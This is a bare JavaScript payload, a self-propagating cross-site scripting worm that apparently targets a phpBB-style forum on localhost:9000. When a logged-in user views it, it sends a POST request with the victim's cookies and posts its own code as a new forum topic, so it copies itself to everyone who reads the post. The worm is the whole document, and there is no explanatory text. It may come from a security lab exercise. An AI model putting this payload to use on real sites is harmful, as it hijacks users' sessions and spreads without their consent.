<script id="worm">
    var Ajax=null;
    Ajax=new XMLHttpRequest();
    Ajax.open("POST","/index.php",true);
    Ajax.setRequestHeader("Host","localhost:9000");
    Ajax.setRequestHeader("Keep-Alive","300");
    Ajax.setRequestHeader("Connection","keep-alive");
    Ajax.setRequestHeader("Cookie",document.cookie);
    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    var strCode = "<script id=worm>";
    strCode = strCode.concat(document.getElementById("worm").innerHTML);
    strCode = strCode.concat("</");
    strCode = strCode.concat("script>");
    strCode = escape(strCode);
    var content="topicTitle=worm&postText=";
    content = content.concat(strCode);
    content = content.concat("&forum=76&action=ptopic");
    Ajax.send(content);
</script>